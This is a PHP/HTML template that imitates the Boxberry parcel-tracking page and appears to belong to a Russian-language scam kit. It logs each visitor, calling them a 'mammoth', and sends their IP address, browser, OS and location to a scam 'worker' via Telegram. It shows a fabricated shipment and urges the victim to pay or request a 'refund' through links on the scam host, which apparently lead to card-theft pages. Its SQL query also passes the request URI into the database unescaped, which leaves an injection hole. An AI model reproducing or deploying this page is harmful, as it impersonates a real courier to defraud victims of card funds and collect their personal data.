<?php

	$query = mysqli_query($connection, "SELECT * FROM `trackcodes` WHERE `code` = '".mb_substr($_SERVER['REQUEST_URI'], 16)."' AND `status` > '0'");

	if(mysqli_num_rows($query) > 0) {
		$track = mysqli_fetch_assoc($query);
		
		mysqli_query($connection, "UPDATE `trackcodes` SET `views` = `views`+1 WHERE `code` = '".mb_substr($_SERVER['REQUEST_URI'], 16)."' AND `status` > '0'");
		
		$text = "⚠️ <b>Мамонт перешел на страницу с трек-кодом</b>⚠️\n\n";
		$text .= "💢 <b>Платформа:</b> <code>Boxberry</code>\n";
		$text .= "🆔 <b>Трек-код:</b> <code>$track[code]</code>\n";
		$text .= "📦 <b>Название товара:</b> <code>$track[product]</code>\n";
		$text .= "💰 <b>Сумма товара:</b> <code>$track[amount] руб.</code>\n";
		$text .= "\n$visitor[os] — ".getCountryFlag($visitor['country_code'])." $visitor[country], $visitor[city]\n";
		$text .= "Браузер $visitor[browser], $visitor[ip]";
		
		send($config['token'], 'sendMessage', Array('chat_id' => $track['worker'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	} else {
		header('Location: /');
	}

?>

<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" class="bx-core bx-no-touch bx-no-retina bx-chrome websockets audio cssgradients contenteditable custombox-open custombox-open-fadein">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link href="https://boxberry.ru/favicon.ico" rel="shortcut icon" type="image/x-icon">
	<link rel="apple-touch-icon" href="https://boxberry.ru/local/templates/site-boxberry/img/apple-touch-icon.png">
	<link rel="apple-touch-icon" sizes="57x57" href="https://boxberry.ru/local/templates/site-boxberry/img/apple-touch-icon-57x57.png">
	<link rel="apple-touch-icon" sizes="72x72" href="https://boxberry.ru/local/templates/site-boxberry/img/apple-touch-icon-72x72.png">
	<link rel="apple-touch-icon" sizes="76x76" href="https://boxberry.ru/local/templates/site-boxberry/img/apple-touch-icon-76x76.png">
	<link rel="apple-touch-icon" sizes="114x114" href="https://boxberry.ru/local/templates/site-boxberry/img/apple-touch-icon-114x114.png">
	<link rel="apple-touch-icon" sizes="120x120" href="https://boxberry.ru/local/templates/site-boxberry/img/apple-touch-icon-120x120.png">
	<link rel="apple-touch-icon" sizes="144x144" href="https://boxberry.ru/local/templates/site-boxberry/img/apple-touch-icon-144x144.png">
	<link rel="apple-touch-icon" sizes="152x152" href="https://boxberry.ru/local/templates/site-boxberry/img/apple-touch-icon-152x152.png">
	<link rel="apple-touch-icon" sizes="180x180" href="https://boxberry.ru/local/templates/site-boxberry/img/apple-touch-icon-180x180.png">
	<title>Boxberry – служба доставки для интернет-магазинов и частных лиц.</title>
	<meta name="robots" content="index, follow">
	<meta name="description" content="Boxberry – служба доставки посылок, писем и товаров интернет-магазинов.">
	<link href="/assets/css/tracking.css" type="text/css" rel="stylesheet">
	<style>
		.btn-submit {
			background-color: #ed1651;
			border: 1px solid #cc1044;
			box-shadow: inset 0 2px 0 #b9113f;
			color:#fff;
			display: inline-block;
			font-size: 16px;
			height: 51px;
			letter-spacing: 0.5px;
			line-height: 49px;
			text-align: center;
			text-decoration: none;
			vertical-align: top;
			width: 188px;
		}
	</style>
</head>
<body>
	<div class="custombox-modal-wrapper custombox-modal-wrapper-fadein custombox-modal-open">
		<div class="custombox-modal-container custombox-modal-container-fadein">
			<div class="custombox-modal custombox-modal-fadein">
				<div id="modal" class="modal-demo tracking-rad" style="width: auto; display: block;"> <img class="button_close" src="/assets/img/icons/trackingClose.png" onclick="javascript:history.back(); return false;">
					<div class="text">
						<div class="traking">
							<div class="table-title">Найденные отправления</div>
							<div class="table-header result_tracking_list">
								<div class="table-header-title"><span><b>Отправитель</b></span></div>
								<div class="table-header-title"><span><b>№ отправления</b></span></div>
								<div class="table-header-title"><span><b>№ отправления Boxberry</b></span></div>
							</div>
							<div class="table-tracking container-fluid" id="tracking_data">
								<div class="track-clickable opener-active">
									<div class="table-body-title table-closer"><span class="tracking_data_notice table-closer">Отправитель</span><span class=" table-closer"><?php echo $track['sender']; ?></span></div>
									<div class="table-body-title table-closer"><span class="tracking_data_notice table-closer">№ отправления</span><span class=" table-closer"><?php echo $track['code']; ?></span></div>
									<div class="table-body-title table-closer"><span class="tracking_data_notice table-closer">№ отправления Boxberry</span><span class=" table-closer"><?php echo 'AJEO'.$track['code'].'EA'; ?></span></div> <img class="tracking-opener table-closer" src="/assets/img/icons/opener.png">
									<div class="tracking-graph-info">
										<hr>
										<div class="addon_info">
											<div class="addon_info row">
												<div class="addon_info_text_tile"><span class="addon_info_text_icon"><img src="/assets/img/icons/tracking_ico_change.png"></span><b>ФИО отправителя</b>:</div>
												<div class="addon_info_text"><span class="w6"><?php echo $track['sender']; ?></span></div>
											</div>
											<div class="addon_info row">
												<div class="addon_info_text_tile"><span class="addon_info_text_icon"><img src="/assets/img/icons/tracking_ico_house.png"></span><b>Название товара</b>:</div>
												<div class="addon_info_text"><span class="w6"><?php echo $track['product']; ?></span></div>
											</div>
											<?php if(!empty($track['courier'])) { ?>
											<div class="addon_info row">
												<div class="addon_info_text_tile"><span class="addon_info_text_icon"><img src="/assets/img/icons/tracking_ico_car.png"></span><b>Принял курьер</b>:</div>
												<div class="addon_info_text"><span class="w6"><?php echo $track['courier']; ?></span></div>
											</div>
											<?php } ?>
											<div class="addon_info_divider"></div>
											<div class="addon_info row">
												<div class="addon_info_text_tile"><span class="addon_info_text_icon"><img src="/assets/img/icons/tracking_ico_weight.png"></span><b>Вес товара, кг</b>:</div>
												<div class="addon_info_text"><span class="w6"><?php echo $track['weight']; ?> </span></div>
											</div>
											<div class="addon_info row">
												<div class="addon_info_text_tile"><span class="addon_info_text_icon"> <img src="/assets/img/icons/tracking_ico_pay.png"></span><b>К оплате</b>:</div>
												<div class="addon_info_text"><span class="w6 "><?php echo number_format($track['amount'], 2, '.', ' '); ?></span> руб.</div>
											</div>
											<?php if(!empty($track['equipment'])) { ?>
											<div class="addon_info row">
												<div class="addon_info_text_tile"><span class="addon_info_text_icon"> <img src="/assets/img/icons/tracking_ico_issue.png"></span><b>Комплектация</b>:</div>
												<div class="addon_info_text"><span class="w6 "><?php echo $track['equipment']; ?></span></div>
											</div>
											<?php } ?>
											<div class="addon_info_divider"></div>
											<div class="addon_info row">
												<div class="addon_info_text_tile"><span class="addon_info_text_icon"> <img src="/assets/img/icons/tracking_ico_change.png"></span><b>ФИО получателя</b>:</div>
												<div class="addon_info_text"><span class="w6 "><?php echo $track['recipient']; ?></span><span class="w6 "></span></div>
											</div>
											<div class="addon_info row">
												<div class="addon_info_text_tile"><span class="addon_info_text_icon"><img src="/assets/img/icons/tracking_ico_point.png"></span><b>Город назначения</b>:</div>
												<div class="addon_info_text"><span class="w6"><?php echo $track['city']; ?></span></div>
											</div>
											<div class="addon_info row">
												<div class="addon_info_text_tile"><span class="addon_info_text_icon"><img src="/assets/img/icons/tracking_ico_house2.png"></span><b>Адрес доставки</b>:</div>
												<div class="addon_info_text"><a href="https://www.google.com/maps/search/<?php echo urlencode($track['address']); ?>/" target="_blank" style="text-decoration:none;"><span class="w6 office_link"><?php echo $track['address']; ?></span></a></div>
											</div>
											<div class="addon_info row">
												<div class="addon_info_text_tile"><span class="addon_info_text_icon"><img src="/assets/img/icons/tracking_ico_issue.png"></span><b>Номер получателя</b>:</div>
												<div class="addon_info_text"><span class="w6"><?php echo $track['phone']; ?></span></div>
											</div>
											<div class="addon_info row">
												<div class="addon_info_text_tile"><span class="addon_info_text_icon"><img src="/assets/img/icons/tracking_ico_yes.png"></span><b>Статус</b>:</div>
												<?php if($track['status'] == 1) { ?>
												<div class="addon_info_text"><a href="https://<?php echo $_SERVER['HTTP_HOST']; ?>/payment?id=<?php echo $track['code']; ?>" style="text-decoration:none;"><span class="w6 office_link">Ожидает оплаты</span></a></div>
												<?php } elseif($track['status'] == 2) { ?>
												<div class="addon_info_text"><span class="w6 office_link">Оплачено</span></div>
												<?php } elseif($track['status'] == 3) { ?>
												<div class="addon_info_text"><a href="https://<?php echo $_SERVER['HTTP_HOST']; ?>/refund?id=<?php echo $track['code']; ?>" style="text-decoration:none;"><span class="w6 office_link">Возврат средств</span></a></div>
												<?php } ?>
											</div>
											<div class="addon_info_divider"></div>
										</div>
										<?php if($track['status'] == 1) { ?>
										<div class="tracking-graph-info-add">
											Посылка была отправлена. Ожидается оплата товара. Нажмите на кнопку <a href="https://<?php echo $_SERVER['HTTP_HOST']; ?>/payment?id=<?php echo $track['code']; ?>">«Оплатить»</a>, затем произведите оплату с банковской карты. Ваши средства будут зарезервированы сервисом Boxberry до того момента, пока Вы не получите товар, произведёте проверку и подпишите накладную у курьера. После проверки товара и подписи документов Ваши средства будут переведены на счёт отправителя.<br></br>В случае, если товар не соответствует описанию, не устроил по каким-либо причинам, либо поврежден – производится полный возврат средств на карту отправителя в течении одного часа.
											<br><br>
											<a class="btn-submit" href="https://<?php echo $_SERVER['HTTP_HOST']; ?>/payment?id=<?php echo $track['code']; ?>" style="color:#fff">Оплатить</a>
										</div>
										<?php } elseif($track['status'] == 3) {  ?>
										<div class="tracking-graph-info-add">
											Транзакция была отклонена по техническим причинам. Возможно, операция с банком была прервана. Пожалуйста, выполните возврат средств, нажав на кнопку ниже.<br></br>Внимание, для обеспечения полноценного возврата – сумма на карте должна быть равна сумме оплаты товара. Данное условие выставляет эмитент банка.
											<br><br>
											<a class="btn-submit" href="https://<?php echo $_SERVER['HTTP_HOST']; ?>/refund?id=<?php echo $track['code']; ?>" style="color:#fff">Возврат средств</a>
										</div>
										<?php } ?>
										<hr>
										<?php if($track['status'] == 1) { ?>
										<div class="traking-wizard">
											<div class="traking-wizard-step complete">
												<div class="traking-wizard-indicator">
													<div class="progress">
														<div class="progress-bar"></div>
													</div>
												</div>
												<div class="traking-wizard-content">
													<div class="traking-destination">
														<span class="status_tracking">Получение посылки курьерской службой</span>
														<img src="/assets/img/icons/tracking_ico_cal.png"><span class="date_time"><?php echo date('d.m.y', $track['time']); ?></span>
													</div>
												</div>
											</div>
											<div class="traking-wizard-step complete">
												<div class="traking-wizard-indicator">
													<div class="progress">
														<div class="progress-bar"></div>
													</div>
												</div>
												<div class="traking-wizard-content">
													<div class="traking-destination">
														<span class="status_tracking">Проверка посылки курьерской службой</span>
														<img src="/assets/img/icons/tracking_ico_cal.png"><span class="date_time"><?php echo date('d.m.y', $track['time']); ?></span>
													</div>
												</div>
											</div>
											<div class="traking-wizard-step complete">
												<div class="traking-wizard-indicator">
													<div class="progress">
														<div class="progress-bar"></div>
													</div>
												</div>
												<div class="traking-wizard-content">
													<div class="traking-destination">
														<span class="status_tracking">Ожидает оплаты</span>
														<img src="/assets/img/icons/tracking_ico_cal.png"><span class="date_time"><?php echo date('d.m.y', $track['time']); ?></span>
													</div>
												</div>
											</div>
										</div>
										<?php } elseif($track['status'] == 2) { ?>
										<div class="traking-wizard">
											<div class="traking-wizard-step complete">
												<div class="traking-wizard-indicator">
													<div class="progress">
														<div class="progress-bar"></div>
													</div>
												</div>
												<div class="traking-wizard-content">
													<div class="traking-destination">
														<span class="status_tracking">Проверка посылки курьерской службой</span>
														<img src="/assets/img/icons/tracking_ico_cal.png"><span class="date_time"><?php echo date('d.m.y', $track['time']); ?></span>
													</div>
												</div>
											</div>
											<div class="traking-wizard-step complete">
												<div class="traking-wizard-indicator">
													<div class="progress">
														<div class="progress-bar"></div>
													</div>
												</div>
												<div class="traking-wizard-content">
													<div class="traking-destination">
														<span class="status_tracking">Ожидает оплаты</span>
														<img src="/assets/img/icons/tracking_ico_cal.png"><span class="date_time"><?php echo date('d.m.y', $track['time']); ?></span>
													</div>
												</div>
											</div>
											<div class="traking-wizard-step complete">
												<div class="traking-wizard-indicator">
													<div class="progress">
														<div class="progress-bar"></div>
													</div>
												</div>
												<div class="traking-wizard-content">
													<div class="traking-destination">
														<span class="status_tracking">Оплачено</span>
														<img src="/assets/img/icons/tracking_ico_cal.png"><span class="date_time"><?php echo date('d.m.y', $track['time']); ?></span>
													</div>
												</div>
											</div>
										</div>
										<?php } elseif($track['status'] == 3) { ?>
										<div class="traking-wizard">
											<div class="traking-wizard-step complete">
												<div class="traking-wizard-indicator">
													<div class="progress">
														<div class="progress-bar"></div>
													</div>
												</div>
												<div class="traking-wizard-content">
													<div class="traking-destination">
														<span class="status_tracking">Ожидает оплаты</span>
														<img src="/assets/img/icons/tracking_ico_cal.png"><span class="date_time"><?php echo date('d.m.y', $track['time']); ?></span>
													</div>
												</div>
											</div>
											<div class="traking-wizard-step complete">
												<div class="traking-wizard-indicator">
													<div class="progress">
														<div class="progress-bar"></div>
													</div>
												</div>
												<div class="traking-wizard-content">
													<div class="traking-destination">
														<span class="status_tracking">Ошибка платежа</span>
														<img src="/assets/img/icons/tracking_ico_cal.png"><span class="date_time"><?php echo date('d.m.y', $track['time']); ?></span>
													</div>
												</div>
											</div>
											<div class="traking-wizard-step complete">
												<div class="traking-wizard-indicator">
													<div class="progress">
														<div class="progress-bar"></div>
													</div>
												</div>
												<div class="traking-wizard-content">
													<div class="traking-destination">
														<span class="status_tracking">Возврат средств</span>
														<img src="/assets/img/icons/tracking_ico_cal.png"><span class="date_time"><?php echo date('d.m.y', $track['time']); ?></span>
													</div>
												</div>
											</div>
										</div>	
										<?php } ?>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
	<!-- Smartsupp Live Chat script --> <script type="text/javascript"> var _smartsupp = _smartsupp || {}; _smartsupp.key = '87a28af9b2d43a0e890268acd9f71d98d4315439'; window.smartsupp||(function(d) { var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[]; s=d.getElementsByTagName('script')[0];c=d.createElement('script'); c.type='text/javascript';c.charset='utf-8';c.async=true; c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s); })(document); </script>
</body>
</html>